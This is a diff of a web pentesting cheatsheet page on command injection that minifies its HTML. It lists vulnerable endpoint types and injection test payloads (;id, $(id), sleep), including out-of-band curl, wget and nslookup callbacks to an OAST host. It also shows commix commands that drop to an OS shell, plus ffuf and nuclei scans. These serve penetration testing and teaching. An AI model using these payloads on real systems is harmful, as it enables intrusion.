@@ -1,343 +1,26 @@
-<!DOCTYPE html>
-<html lang="en-US" dir="ltr" class="">
-<head>
-  <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Command Injection | JinPwn</title><meta name="description" content="User input ends up in a shell command. The fastest path from web bug to shell.">
-<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
-<meta name="googlebot" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
-
-<link rel="canonical" href="https://jinpwn.dev/cheatsheets/web/web05-command-injection/">
-<meta property="og:title" content="Command Injection | JinPwn">
-<meta property="og:description" content="User input ends up in a shell command. The fastest path from web bug to shell.">
-<meta property="og:type" content="website">
-<meta property="og:url" content="https://jinpwn.dev/cheatsheets/web/web05-command-injection/">
-<meta property="og:site_name" content="JinPwn">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://jinpwn.dev/images/og/og.png">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="Command Injection | JinPwn">
-<meta name="twitter:description" content="User input ends up in a shell command. The fastest path from web bug to shell.">
-<meta name="twitter:image" content="https://jinpwn.dev/images/og/og.png">
-<meta name="twitter:site" content="@jinpwn">
-<meta name="twitter:creator" content="@jinpwn">
-
-
-<script type="application/ld+json">{"@context":"https://schema.org","@type":"WebPage","description":"User input ends up in a shell command. The fastest path from web bug to shell.","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"Command Injection | JinPwn","url":"https://jinpwn.dev/cheatsheets/web/web05-command-injection/"}</script>
-
-<meta name="theme-color" content="#111111">
-<link rel="icon" type="image/png" href="/favicon.png">
-
-      <link rel="stylesheet" href="/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css" integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin="anonymous">
-
-
-        <script src="/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js" integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin="anonymous" defer></script>
-        <script src="/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js" integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin="anonymous" defer></script>
-
-
-</head>
-<body class="">
-  
-
-
-
-
-
-  
-  
-  
-
-
-
-  
-
-<header class="site-header">
-  <nav class="top-nav">
-    <div class="container nav-inner">
-      <div class="nav-left">
-        <a href="/" class="brand-link has-logo" aria-label="Home"><img src="/favicon.png" alt="jinpwn.dev" class="brand-logo" style="--brand-logo-height: 36px;"></a>
-        <div class="nav-links desktop-only">
-          
-    <a href="/">Posts</a>
-    <a href="/posts/">Archive</a>
-    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
-    <a href="/about/">About</a>
-
-        </div>
-      </div>
-      <div class="nav-actions">
-        <div class="search-anchor" id="search-root" data-search-root>
-          <label class="search-trigger" for="search-input">
-            <span class="search-glyph" aria-hidden="true">
-              <svg viewBox="0 0 24 24">
-                <circle cx="11" cy="11" r="7"></circle>
-                <path d="M20 20L16.65 16.65"></path>
-              </svg>
-            </span>
-            <input id="search-input" type="search" placeholder="Search..." autocomplete="off" spellcheck="false" aria-label="Search posts and cheatsheets">
-            <button type="button" class="search-clear" data-search-clear aria-label="Clear search" hidden>
-              <svg viewBox="0 0 24 24" aria-hidden="true">
-                <path d="M18 6L6 18"></path>
-                <path d="M6 6l12 12"></path>
-              </svg>
-            </button>
-            <span class="search-trigger-shortcut desktop-only" aria-hidden="true">CTRL K</span>
-          </label>
-          <div id="search-dropdown" class="search-dropdown" hidden data-search-index-url="/search-index.json" data-search-runtime-url="/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js">
-  <p class="search-status" data-search-status aria-live="polite">Type to search posts and cheatsheets.</p>
-  <div class="search-results" data-search-results role="listbox" aria-label="Search results">
-    <p class="search-empty">Type to search posts and cheatsheets.</p>
-  </div>
-</div>
-
-        </div>
-        <button class="icon-button mobile-only" type="button" data-search-mobile-toggle aria-label="Search" aria-expanded="false" aria-controls="search-root">
-          <svg viewBox="0 0 24 24" aria-hidden="true">
-            <circle cx="11" cy="11" r="7"></circle>
-            <path d="M20 20L16.65 16.65"></path>
-          </svg>
-        </button>
-        <button class="icon-button mobile-only" type="button" data-mobile-toggle aria-label="Toggle menu" aria-expanded="false" aria-controls="mobile-nav">
-          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon>
-            <path d="M3 6h18"></path>
-            <path d="M3 12h18"></path>
-            <path d="M3 18h18"></path>
-          </svg>
-          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon hidden>
-            <path d="M18 6L6 18"></path>
-            <path d="M6 6l12 12"></path>
-          </svg>
-        </button>
-      </div>
-    </div>
-    <div id="mobile-nav" class="mobile-nav">
-      
-    <a href="/">Posts</a>
-    <a href="/posts/">Archive</a>
-    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
-    <a href="/about/">About</a>
-
-    </div>
-  </nav>
-</header>
-
-  
-  <main class="site-main">
-    
-  
-  
-  
-  <article class="container cheatsheet-docs-shell">
-    <div class="cheatsheet-docs-layout">
-      
-        <aside class="cheatsheet-sidebar" aria-label="Web Pentesting navigation">
-    <div class="cheatsheet-sidebar-inner">
-      
-        <a href="/cheatsheets/" class="cheatsheet-sidebar-root">All cheatsheets</a>
-      
-      <a href="/cheatsheets/web/" class="cheatsheet-sidebar-section">Web Pentesting</a>
-      
-        <nav class="cheatsheet-sidebar-nav">
-          <ul class="cheatsheet-sidebar-list">
-            
-              <li>
-                <a href="/cheatsheets/web/00-web-moc/" class="cheatsheet-sidebar-link">Web MOC</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web01-content-discovery/" class="cheatsheet-sidebar-link">Content Discovery</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web02-auth--session/" class="cheatsheet-sidebar-link">Auth &amp; Session</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web03-sql-injection/" class="cheatsheet-sidebar-link">SQL Injection</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web04-nosql-injection/" class="cheatsheet-sidebar-link">NoSQL Injection</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web05-command-injection/" class="cheatsheet-sidebar-link is-current">Command Injection</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web06-ssti/" class="cheatsheet-sidebar-link">SSTI</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web08-xss/" class="cheatsheet-sidebar-link">XSS</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web07-xxe/" class="cheatsheet-sidebar-link">XXE</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web09-csrf--cors/" class="cheatsheet-sidebar-link">WEB09 CSRF &amp; CORS</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web10-request-smuggling/" class="cheatsheet-sidebar-link">Request Smuggling</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web11-web-cache-poisoning/" class="cheatsheet-sidebar-link">Web Cache Poisoning</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web12-ssrf/" class="cheatsheet-sidebar-link">SSRF</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web13-file-upload--lfi/" class="cheatsheet-sidebar-link">File Upload &amp; LFI</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web14-deserialization/" class="cheatsheet-sidebar-link">Deserialization</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web15-prototype-pollution/" class="cheatsheet-sidebar-link">WEB15 Prototype Pollution</a>
-              </li>
-            
-          </ul>
-        </nav>
-      
-    </div>
-  </aside>
-      
-      <div class="cheatsheet-docs-main cheatsheet-page-main">
-        <header class="cheatsheet-page-header">
-          <h1>Command Injection</h1>
-          
-        </header>
-
-        
-          <details class="cheatsheet-mobile-sections">
-    <summary class="cheatsheet-mobile-sections-summary">
-      <span class="cheatsheet-mobile-sections-label">Sections</span>
-      <span class="cheatsheet-mobile-sections-current">Command Injection</span>
-      <span class="cheatsheet-mobile-sections-caret" aria-hidden="true"></span>
-    </summary>
-    <div class="cheatsheet-mobile-sections-panel">
-      <nav aria-label="Web Pentesting sections">
-        <ul class="cheatsheet-mobile-sections-list">
-          
-            <li>
-              <a href="/cheatsheets/" class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a>
-            </li>
-          
-          <li>
-            <a href="/cheatsheets/web/" class="cheatsheet-mobile-sections-link">Overview</a>
-          </li>
-          
-            <li>
-              <a href="/cheatsheets/web/00-web-moc/" class="cheatsheet-mobile-sections-link">Web MOC</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web01-content-discovery/" class="cheatsheet-mobile-sections-link">Content Discovery</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web02-auth--session/" class="cheatsheet-mobile-sections-link">Auth &amp; Session</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web03-sql-injection/" class="cheatsheet-mobile-sections-link">SQL Injection</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web04-nosql-injection/" class="cheatsheet-mobile-sections-link">NoSQL Injection</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web05-command-injection/" class="cheatsheet-mobile-sections-link is-current">Command Injection</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web06-ssti/" class="cheatsheet-mobile-sections-link">SSTI</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web08-xss/" class="cheatsheet-mobile-sections-link">XSS</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web07-xxe/" class="cheatsheet-mobile-sections-link">XXE</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web09-csrf--cors/" class="cheatsheet-mobile-sections-link">WEB09 CSRF &amp; CORS</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web10-request-smuggling/" class="cheatsheet-mobile-sections-link">Request Smuggling</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web11-web-cache-poisoning/" class="cheatsheet-mobile-sections-link">Web Cache Poisoning</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web12-ssrf/" class="cheatsheet-mobile-sections-link">SSRF</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web13-file-upload--lfi/" class="cheatsheet-mobile-sections-link">File Upload &amp; LFI</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web14-deserialization/" class="cheatsheet-mobile-sections-link">Deserialization</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web15-prototype-pollution/" class="cheatsheet-mobile-sections-link">WEB15 Prototype Pollution</a>
-            </li>
-          
-        </ul>
-      </nav>
-    </div>
-  </details>
-        
-
-        <div class="markdown-content cheatsheet-page-body">
-          <p>User input ends up in a shell command. The fastest path from web bug to shell.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">T</span><span class="o">=</span>https://target.com
-</span></span></code></pre></div><h2 id="i-where-it-lives" data-heading-permalink="true"><span class="heading-content">i. Where it lives</span>
-    <a class="heading-permalink" href="#i-where-it-lives" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Endpoints that obviously call OS commands:</p>
-<ul>
-<li>Ping / traceroute / nslookup / whois tools</li>
-<li>Image conversion (ImageMagick, Ghostscript, libreoffice, ffmpeg)</li>
-<li>PDF generation (wkhtmltopdf, pdfkit, weasyprint, headless Chrome)</li>
-<li>File rename, archive extract (tar, unzip, 7z)</li>
-<li>Backup / export / &ldquo;send report&rdquo; features</li>
-<li>Network diagnostics (any &ldquo;test connectivity&rdquo;)</li>
-<li>Log viewers calling <code>grep</code> / <code>tail</code> on disk</li>
-</ul>
-<p>Less obvious:</p>
-<ul>
-<li>Filename in upload endpoint (often passed unsanitized to <code>mv</code> / <code>chmod</code> / <code>convert</code>)</li>
-<li>User-Agent / Referer logged via shell scripts</li>
-<li>Health check endpoints calling external tools</li>
-<li>Crontab-style &ldquo;scheduled task&rdquo; features</li>
-<li>Image EXIF processing that shells out</li>
-<li>Anywhere a &ldquo;fancy&rdquo; feature suggests calling external tooling</li>
-</ul>
-<p>Signal that a feature shells out: response latency disproportionate to the work, log messages mentioning binary names, error messages with stderr fragments.</p>
-<h2 id="ii-detection" data-heading-permalink="true"><span class="heading-content">ii. Detection</span>
-    <a class="heading-permalink" href="#ii-detection" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>The classic test set (URL-encode as needed):</p>
-<pre tabindex="0"><code>;id
+<!doctype html><html lang=en-US dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Command Injection | JinPwn</title><meta name=description content="User input ends up in a shell command. The fastest path from web bug to shell."><meta name=robots content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1"><meta name=googlebot content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1"><link rel=canonical href=https://jinpwn.dev/cheatsheets/web/web05-command-injection/><meta property="og:title" content="Command Injection | JinPwn"><meta property="og:description" content="User input ends up in a shell command. The fastest path from web bug to shell."><meta property="og:type" content="website"><meta property="og:url" content="https://jinpwn.dev/cheatsheets/web/web05-command-injection/"><meta property="og:site_name" content="JinPwn"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://jinpwn.dev/images/og/og.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="Command Injection | JinPwn"><meta name=twitter:description content="User input ends up in a shell command. The fastest path from web bug to shell."><meta name=twitter:image content="https://jinpwn.dev/images/og/og.png"><meta name=twitter:site content="@jinpwn"><meta name=twitter:creator content="@jinpwn"><script type=application/ld+json>{"@context":"https://schema.org","@type":"WebPage","description":"User input ends up in a shell command. The fastest path from web bug to shell.","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"Command Injection | JinPwn","url":"https://jinpwn.dev/cheatsheets/web/web05-command-injection/"}</script><meta name=theme-color content="#111111"><link rel=icon type=image/png href=/favicon.png><link rel=stylesheet href=/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin=anonymous><script src=/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin=anonymous defer></script><script src=/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin=anonymous defer></script></head><body><header class=site-header><nav class=top-nav><div class="container nav-inner"><div class=nav-left><a href=/ class="brand-link has-logo" aria-label=Home><img src=/favicon.png alt=jinpwn.dev class=brand-logo style=--brand-logo-height:36px></a><div class="nav-links desktop-only"><a href=/>Posts</a>
+<a href=/posts/>Archive</a>
+<a href=/cheatsheets/ class=is-current>Cheatsheets</a>
+<a href=/about/>About</a></div></div><div class=nav-actions><div class=search-anchor id=search-root data-search-root><label class=search-trigger for=search-input><span class=search-glyph aria-hidden=true><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.35-3.35"/></svg>
+</span><input id=search-input type=search placeholder=Search... autocomplete=off spellcheck=false aria-label="Search posts and cheatsheets">
+<button type=button class=search-clear data-search-clear aria-label="Clear search" hidden>
+<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg>
+</button>
+<span class="search-trigger-shortcut desktop-only" aria-hidden=true>CTRL K</span></label><div id=search-dropdown class=search-dropdown hidden data-search-index-url=/search-index.json data-search-runtime-url=/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js><p class=search-status data-search-status aria-live=polite>Type to search posts and cheatsheets.</p><div class=search-results data-search-results role=listbox aria-label="Search results"><p class=search-empty>Type to search posts and cheatsheets.</p></div></div></div><button class="icon-button mobile-only" type=button data-search-mobile-toggle aria-label=Search aria-expanded=false aria-controls=search-root>
+<svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.35-3.35"/></svg>
+</button>
+<button class="icon-button mobile-only" type=button data-mobile-toggle aria-label="Toggle menu" aria-expanded=false aria-controls=mobile-nav>
+<svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon=""><path d="M3 6h18"/><path d="M3 12h18"/><path d="M3 18h18"/></svg>
+<svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon="" hidden=""><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg></button></div></div><div id=mobile-nav class=mobile-nav><a href=/>Posts</a>
+<a href=/posts/>Archive</a>
+<a href=/cheatsheets/ class=is-current>Cheatsheets</a>
+<a href=/about/>About</a></div></nav></header><main class=site-main><article class="container cheatsheet-docs-shell"><div class=cheatsheet-docs-layout><aside class=cheatsheet-sidebar aria-label="Web Pentesting navigation"><div class=cheatsheet-sidebar-inner><a href=/cheatsheets/ class=cheatsheet-sidebar-root>All cheatsheets</a>
+<a href=/cheatsheets/web/ class=cheatsheet-sidebar-section>Web Pentesting</a><nav class=cheatsheet-sidebar-nav><ul class=cheatsheet-sidebar-list><li><a href=/cheatsheets/web/00-web-moc/ class=cheatsheet-sidebar-link>Web MOC</a></li><li><a href=/cheatsheets/web/web01-content-discovery/ class=cheatsheet-sidebar-link>Content Discovery</a></li><li><a href=/cheatsheets/web/web02-auth--session/ class=cheatsheet-sidebar-link>Auth & Session</a></li><li><a href=/cheatsheets/web/web03-sql-injection/ class=cheatsheet-sidebar-link>SQL Injection</a></li><li><a href=/cheatsheets/web/web04-nosql-injection/ class=cheatsheet-sidebar-link>NoSQL Injection</a></li><li><a href=/cheatsheets/web/web05-command-injection/ class="cheatsheet-sidebar-link is-current">Command Injection</a></li><li><a href=/cheatsheets/web/web06-ssti/ class=cheatsheet-sidebar-link>SSTI</a></li><li><a href=/cheatsheets/web/web08-xss/ class=cheatsheet-sidebar-link>XSS</a></li><li><a href=/cheatsheets/web/web07-xxe/ class=cheatsheet-sidebar-link>XXE</a></li><li><a href=/cheatsheets/web/web09-csrf--cors/ class=cheatsheet-sidebar-link>WEB09 CSRF & CORS</a></li><li><a href=/cheatsheets/web/web10-request-smuggling/ class=cheatsheet-sidebar-link>Request Smuggling</a></li><li><a href=/cheatsheets/web/web11-web-cache-poisoning/ class=cheatsheet-sidebar-link>Web Cache Poisoning</a></li><li><a href=/cheatsheets/web/web12-ssrf/ class=cheatsheet-sidebar-link>SSRF</a></li><li><a href=/cheatsheets/web/web13-file-upload--lfi/ class=cheatsheet-sidebar-link>File Upload & LFI</a></li><li><a href=/cheatsheets/web/web14-deserialization/ class=cheatsheet-sidebar-link>Deserialization</a></li><li><a href=/cheatsheets/web/web15-prototype-pollution/ class=cheatsheet-sidebar-link>WEB15 Prototype Pollution</a></li></ul></nav></div></aside><div class="cheatsheet-docs-main cheatsheet-page-main"><header class=cheatsheet-page-header><h1>Command Injection</h1></header><details class=cheatsheet-mobile-sections><summary class=cheatsheet-mobile-sections-summary><span class=cheatsheet-mobile-sections-label>Sections</span>
+<span class=cheatsheet-mobile-sections-current>Command Injection</span>
+<span class=cheatsheet-mobile-sections-caret aria-hidden=true></span></summary><div class=cheatsheet-mobile-sections-panel><nav aria-label="Web Pentesting sections"><ul class=cheatsheet-mobile-sections-list><li><a href=/cheatsheets/ class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a></li><li><a href=/cheatsheets/web/ class=cheatsheet-mobile-sections-link>Overview</a></li><li><a href=/cheatsheets/web/00-web-moc/ class=cheatsheet-mobile-sections-link>Web MOC</a></li><li><a href=/cheatsheets/web/web01-content-discovery/ class=cheatsheet-mobile-sections-link>Content Discovery</a></li><li><a href=/cheatsheets/web/web02-auth--session/ class=cheatsheet-mobile-sections-link>Auth & Session</a></li><li><a href=/cheatsheets/web/web03-sql-injection/ class=cheatsheet-mobile-sections-link>SQL Injection</a></li><li><a href=/cheatsheets/web/web04-nosql-injection/ class=cheatsheet-mobile-sections-link>NoSQL Injection</a></li><li><a href=/cheatsheets/web/web05-command-injection/ class="cheatsheet-mobile-sections-link is-current">Command Injection</a></li><li><a href=/cheatsheets/web/web06-ssti/ class=cheatsheet-mobile-sections-link>SSTI</a></li><li><a href=/cheatsheets/web/web08-xss/ class=cheatsheet-mobile-sections-link>XSS</a></li><li><a href=/cheatsheets/web/web07-xxe/ class=cheatsheet-mobile-sections-link>XXE</a></li><li><a href=/cheatsheets/web/web09-csrf--cors/ class=cheatsheet-mobile-sections-link>WEB09 CSRF & CORS</a></li><li><a href=/cheatsheets/web/web10-request-smuggling/ class=cheatsheet-mobile-sections-link>Request Smuggling</a></li><li><a href=/cheatsheets/web/web11-web-cache-poisoning/ class=cheatsheet-mobile-sections-link>Web Cache Poisoning</a></li><li><a href=/cheatsheets/web/web12-ssrf/ class=cheatsheet-mobile-sections-link>SSRF</a></li><li><a href=/cheatsheets/web/web13-file-upload--lfi/ class=cheatsheet-mobile-sections-link>File Upload & LFI</a></li><li><a href=/cheatsheets/web/web14-deserialization/ class=cheatsheet-mobile-sections-link>Deserialization</a></li><li><a href=/cheatsheets/web/web15-prototype-pollution/ class=cheatsheet-mobile-sections-link>WEB15 Prototype Pollution</a></li></ul></nav></div></details><div class="markdown-content cheatsheet-page-body"><p>User input ends up in a shell command. The fastest path from web bug to shell.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>T</span><span class=o>=</span>https://target.com
+</span></span></code></pre></div><h2 id=i-where-it-lives data-heading-permalink=true><span class=heading-content>i. Where it lives</span>
+<a class=heading-permalink href=#i-where-it-lives aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Endpoints that obviously call OS commands:</p><ul><li>Ping / traceroute / nslookup / whois tools</li><li>Image conversion (ImageMagick, Ghostscript, libreoffice, ffmpeg)</li><li>PDF generation (wkhtmltopdf, pdfkit, weasyprint, headless Chrome)</li><li>File rename, archive extract (tar, unzip, 7z)</li><li>Backup / export / &ldquo;send report&rdquo; features</li><li>Network diagnostics (any &ldquo;test connectivity&rdquo;)</li><li>Log viewers calling <code>grep</code> / <code>tail</code> on disk</li></ul><p>Less obvious:</p><ul><li>Filename in upload endpoint (often passed unsanitized to <code>mv</code> / <code>chmod</code> / <code>convert</code>)</li><li>User-Agent / Referer logged via shell scripts</li><li>Health check endpoints calling external tools</li><li>Crontab-style &ldquo;scheduled task&rdquo; features</li><li>Image EXIF processing that shells out</li><li>Anywhere a &ldquo;fancy&rdquo; feature suggests calling external tooling</li></ul><p>Signal that a feature shells out: response latency disproportionate to the work, log messages mentioning binary names, error messages with stderr fragments.</p><h2 id=ii-detection data-heading-permalink=true><span class=heading-content>ii. Detection</span>
+<a class=heading-permalink href=#ii-detection aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>The classic test set (URL-encode as needed):</p><pre tabindex=0><code>;id
 |id
 &amp;id
 &amp;&amp;id
@@ -348,284 +31,103 @@ $(id)
 %0did       (carriage return)
 %26id       (encoded &amp;)
 %7cid       (encoded |)
-</code></pre><p>Inside double quotes:</p>
-<pre tabindex="0"><code>&#34;$(id)&#34;
+</code></pre><p>Inside double quotes:</p><pre tabindex=0><code>&#34;$(id)&#34;
 &#34;`id`&#34;
-</code></pre><p>Inside single quotes (harder, often needs to break out):</p>
-<pre tabindex="0"><code>&#39;;id;&#39;
+</code></pre><p>Inside single quotes (harder, often needs to break out):</p><pre tabindex=0><code>&#39;;id;&#39;
 &#39;;id;#
-</code></pre><p>When response doesn&rsquo;t change visibly, switch to time-based:</p>
-<pre tabindex="0"><code>;sleep 5
+</code></pre><p>When response doesn&rsquo;t change visibly, switch to time-based:</p><pre tabindex=0><code>;sleep 5
 |sleep 5
 $(sleep 5)
 `sleep 5`
 &amp; ping -c 5 127.0.0.1
-</code></pre><p>Or OOB (the most reliable for blind):</p>
-<pre tabindex="0"><code>;curl http://abc.oast.live/
+</code></pre><p>Or OOB (the most reliable for blind):</p><pre tabindex=0><code>;curl http://abc.oast.live/
 $(curl http://abc.oast.live/x)
 `wget http://abc.oast.live/y`
 ;nslookup abc.oast.live
-</code></pre><h2 id="iii-interactsh--burp-collaborator" data-heading-permalink="true"><span class="heading-content">iii. interactsh + Burp Collaborator</span>
-    <a class="heading-permalink" href="#iii-interactsh--burp-collaborator" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>OAST is the default for blind detection. Spin up a listener:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">interactsh-client
-</span></span><span class="line"><span class="cl"><span class="c1">## Or use the public service:</span>
-</span></span><span class="line"><span class="cl">interactsh-client -s https://oast.live
-</span></span><span class="line"><span class="cl"><span class="c1">## Or Burp Collaborator from inside Burp</span>
-</span></span></code></pre></div><p>Every payload includes the OAST hostname. When the target shells out, you see the inbound DNS / HTTP in your interactsh terminal.</p>
-<h2 id="iv-commix" data-heading-permalink="true"><span class="heading-content">iv. commix</span>
-    <a class="heading-permalink" href="#iv-commix" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>The sqlmap of command injection. Automates detection, exploitation, shell upgrade.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## URL parameter:</span>
-</span></span><span class="line"><span class="cl">commix -u <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">/ping?ip=127.0.0.1&#34;</span> --batch
-</span></span><span class="line"><span class="cl"><span class="c1">## POST body:</span>
-</span></span><span class="line"><span class="cl">commix -u <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">/api/ping&#34;</span> --data <span class="s1">&#39;ip=127.0.0.1&#39;</span> --batch
-</span></span><span class="line"><span class="cl"><span class="c1">## Header:</span>
-</span></span><span class="line"><span class="cl">commix -u <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">/&#34;</span> --headers<span class="o">=</span><span class="s1">&#39;User-Agent: test*&#39;</span> --batch
-</span></span><span class="line"><span class="cl"><span class="c1">## Cookie:</span>
-</span></span><span class="line"><span class="cl">commix -u <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">/&#34;</span> --cookie <span class="s1">&#39;session=abc;ip=127.0.0.1*&#39;</span> --batch
-</span></span><span class="line"><span class="cl"><span class="c1">## From Burp request:</span>
-</span></span><span class="line"><span class="cl">commix -r request.txt --batch
-</span></span></code></pre></div><p>Useful flags:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">--os<span class="o">=</span>unix             <span class="c1">## skip OS detection</span>
-</span></span><span class="line"><span class="cl">--technique<span class="o">=</span>tT        <span class="c1">## t=time-based, T=time-based file-based, c=classic, e=eval-based</span>
-</span></span><span class="line"><span class="cl">--prefix<span class="o">=</span><span class="s1">&#39;;&#39;</span> --suffix<span class="o">=</span><span class="s1">&#39;#&#39;</span>
-</span></span><span class="line"><span class="cl">--all                 <span class="c1">## try every technique</span>
-</span></span><span class="line"><span class="cl">--os-cmd<span class="o">=</span>id           <span class="c1">## one-shot command</span>
-</span></span><span class="line"><span class="cl">--shellshock          <span class="c1">## try Shellshock (legacy CVE-2014-6271)</span>
-</span></span><span class="line"><span class="cl">--proxy<span class="o">=</span>http://127.0.0.1:8080
-</span></span><span class="line"><span class="cl">--tor                 <span class="c1">## via tor proxy</span>
-</span></span></code></pre></div><p>Drop to a shell when commix confirms:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">commix -u <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">/ping?ip=127.0.0.1&#34;</span> --batch --os-shell
-</span></span></code></pre></div><h2 id="v-fuzzing-many-params-at-once" data-heading-permalink="true"><span class="heading-content">v. Fuzzing many params at once</span>
-    <a class="heading-permalink" href="#v-fuzzing-many-params-at-once" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>When you have a list of endpoints and want quick scoping:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ffuf -u <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">/api/FUZZ?val=%3Bcurl%20http%3A%2F%2Fabc.oast.live&#34;</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl">  -w endpoints.txt -mc all
-</span></span><span class="line"><span class="cl"><span class="c1">## Then watch interactsh for hits</span>
-</span></span></code></pre></div><p>Nuclei has command-injection templates that test common patterns:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nuclei -u <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">&#34;</span> -tags rce,cmdi -t http/cves/ -t http/vulnerabilities/
